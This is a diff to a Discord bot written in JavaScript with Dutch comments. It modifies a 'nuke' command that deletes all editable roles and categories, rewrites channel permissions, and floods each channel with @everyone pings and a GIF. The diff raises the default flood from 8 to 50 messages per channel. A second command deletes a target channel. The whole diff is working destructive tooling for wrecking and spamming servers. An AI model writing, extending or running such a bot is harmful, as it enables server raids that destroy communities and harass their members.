@@ -23,19 +23,16 @@ client.on('messageCreate', async message => {
 
     const args = message.content.slice(PREFIX.length).trim().split(/ +/);
     const command = args.shift()?.toLowerCase();
-    const spamAmount = parseInt(args[0]) || 8; // standaard 8x spam per channel
+    const spamAmount = parseInt(args[0]) || 50; // Standaard 50x spam per channel
 
     if (command === 'all') {
         if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
             return message.reply("❌ Administrator rechten nodig!");
         }
 
-        // DM waarschuwing
         try {
-            await message.author.send("⚠️ **SNELLE NUKE START** ⚠️\nRollen + Categorieën verwijderen + Mass spam starten...");
-        } catch (e) {
-            message.reply("❌ Kon geen DM sturen.");
-        }
+            await message.author.send(`⚠️ **EXTREME NUKE** ⚠️\nSpam ingesteld op **${spamAmount}x** per channel.`);
+        } catch {}
 
         let cancelled = false;
         const collector = message.channel.createMessageCollector({
@@ -47,17 +44,17 @@ client.on('messageCreate', async message => {
         await new Promise(r => setTimeout(r, 3000));
         if (cancelled) return;
 
-        // 1. Rollen verwijderen
+        // Rollen verwijderen
         for (const role of message.guild.roles.cache.filter(r => r.name !== "@everyone" && r.editable).values()) {
             try { await role.delete(); } catch {}
         }
 
-        // 2. Categorieën verwijderen
+        // Categorieën verwijderen
         for (const category of message.guild.channels.cache.filter(ch => ch.type === ChannelType.GuildCategory).values()) {
             try { await category.delete(); } catch {}
         }
 
-        // 3. Channels bewerken + spammen (sneller)
+        // Channels tegelijkertijd bewerken + mass spam
         let processed = 0;
         const promises = [];
 
@@ -72,7 +69,7 @@ client.on('messageCreate', async message => {
                         ReadMessageHistory: true
                     }).catch(() => {});
 
-                    // Meer spam
+                    // 50x spam (of meer)
                     for (let i = 0; i < spamAmount; i++) {
                         await channel.send(`@everyone\n${GIF_URL}`).catch(() => {});
                     }
@@ -85,10 +82,10 @@ client.on('messageCreate', async message => {
 
         await Promise.all(promises);
 
-        // Finale bericht alleen in DM
+        // Eindresultaat in DM
         try {
             await message.author.send(`[DONE] ${processed} channels changed`);
-        } catch (e) {
+        } catch {
             message.channel.send(`[DONE] ${processed} channels changed`);
         }
 
@@ -98,9 +95,7 @@ client.on('messageCreate', async message => {
     // Normale .1 delete
     let target = args.length > 0 ? message.mentions.channels.first() : message.channel;
     if (target) {
-        try {
-            await target.delete();
-        } catch {}
+        try { await target.delete(); } catch {}
     }
 });
 
